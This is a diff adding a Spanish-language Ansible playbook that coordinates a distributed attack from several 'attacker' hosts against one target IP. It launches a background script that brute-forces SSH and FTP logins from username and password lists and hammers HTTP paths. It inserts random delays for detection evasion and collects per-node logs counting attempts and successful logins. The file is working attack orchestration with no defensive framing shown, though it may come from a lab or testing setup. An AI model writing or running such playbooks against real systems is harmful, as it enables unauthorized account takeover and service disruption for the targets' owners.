@@ -1,0 +1,110 @@
+---
+- name: "Ejecutar Ataque Distribuido Coordinado"
+  hosts: attackers
+  become: yes
+  serial: 1
+  
+  vars:
+    attack_start_time: "{{ ansible_date_time.epoch }}"
+    
+  tasks:
+    - name: "Verificar estado del objetivo"
+      wait_for:
+        host: "{{ target_ip }}"
+        port: "{{ ssh_attack.port if target_service == 'ssh' else ftp_attack.port }}"
+        timeout: 10
+      delegate_to: localhost
+      
+    - name: "Generar delay aleatorio para evasión"
+      set_fact:
+        random_delay: "{{ range(evasion.min_delay, evasion.max_delay) | random }}"
+        
+    - name: "Esperar delay de evasión"
+      pause:
+        seconds: "{{ random_delay }}"
+        
+    - name: "Iniciar ataque SSH distribuido"
+      shell: |
+        nohup python3 /opt/attack_coordinator.py \
+          --service ssh \
+          --target {{ target_ip }} \
+          --port {{ ssh_attack.port }} \
+          --threads {{ ssh_attack.threads }} \
+          --userlist {{ ssh_attack.username_list }} \
+          --passlist {{ ssh_attack.password_list }} \
+          --duration {{ attack_duration }} \
+          --rate {{ attack_rate }} \
+          --node-id {{ node_id }} \
+          --log-file /var/log/distributed-attack/node-{{ node_id }}-ssh.log \
+          > /dev/null 2>&1 &
+      when: target_service == 'ssh'
+      
+    - name: "Iniciar ataque FTP distribuido"
+      shell: |
+        nohup python3 /opt/attack_coordinator.py \
+          --service ftp \
+          --target {{ target_ip }} \
+          --port {{ ftp_attack.port }} \
+          --threads {{ ftp_attack.threads }} \
+          --userlist {{ ftp_attack.username_list }} \
+          --passlist {{ ftp_attack.password_list }} \
+          --duration {{ attack_duration }} \
+          --rate {{ attack_rate }} \
+          --node-id {{ node_id }} \
+          --log-file /var/log/distributed-attack/node-{{ node_id }}-ftp.log \
+          > /dev/null 2>&1 &
+      when: target_service == 'ftp'
+      
+    - name: "Iniciar ataque HTTP distribuido"
+      shell: |
+        nohup python3 /opt/attack_coordinator.py \
+          --service http \
+          --target {{ target_ip }} \
+          --port {{ http_attack.port }} \
+          --threads {{ http_attack.threads }} \
+          --paths {{ http_attack.paths | join(',') }} \
+          --duration {{ attack_duration }} \
+          --rate {{ attack_rate }} \
+          --node-id {{ node_id }} \
+          --log-file /var/log/distributed-attack/node-{{ node_id }}-http.log \
+          > /dev/null 2>&1 &
+      when: target_service == 'http'
+      
+    - name: "Registrar inicio de ataque"
+      lineinfile:
+        path: "/var/log/distributed-attack/coordination.log"
+        line: "{{ ansible_date_time.iso8601 }} - Node {{ node_id }} - Started {{ target_service }} attack against {{ target_ip }}"
+        create: yes
+
+- name: "Monitorear Progreso del Ataque"
+  hosts: attackers
+  become: yes
+  
+  tasks:
+    - name: "Esperar finalización del ataque"
+      wait_for:
+        timeout: "{{ attack_duration + 60 }}"
+        
+    - name: "Recopilar logs de ataque"
+      fetch:
+        src: "/var/log/distributed-attack/node-{{ node_id }}-{{ target_service }}.log"
+        dest: "./logs/attackers/"
+        flat: yes
+        
+    - name: "Generar reporte de nodo"
+      shell: |
+        echo "=== Reporte Nodo {{ node_id }} ===" > /tmp/node_report.txt
+        echo "Servicio: {{ target_service }}" >> /tmp/node_report.txt
+        echo "Objetivo: {{ target_ip }}" >> /tmp/node_report.txt
+        echo "Duración: {{ attack_duration }}s" >> /tmp/node_report.txt
+        echo "Tasa: {{ attack_rate }}" >> /tmp/node_report.txt
+        echo "Intentos realizados:" >> /tmp/node_report.txt
+        grep -c "attempt" /var/log/distributed-attack/node-{{ node_id }}-{{ target_service }}.log >> /tmp/node_report.txt || echo "0" >> /tmp/node_report.txt
+        echo "Conexiones exitosas:" >> /tmp/node_report.txt
+        grep -c "success" /var/log/distributed-attack/node-{{ node_id }}-{{ target_service }}.log >> /tmp/node_report.txt || echo "0" >> /tmp/node_report.txt
+        
+    - name: "Recopilar reporte de nodo"
+      fetch:
+        src: "/tmp/node_report.txt"
+        dest: "./reports/node-{{ node_id }}-report.txt"
+        flat: yes
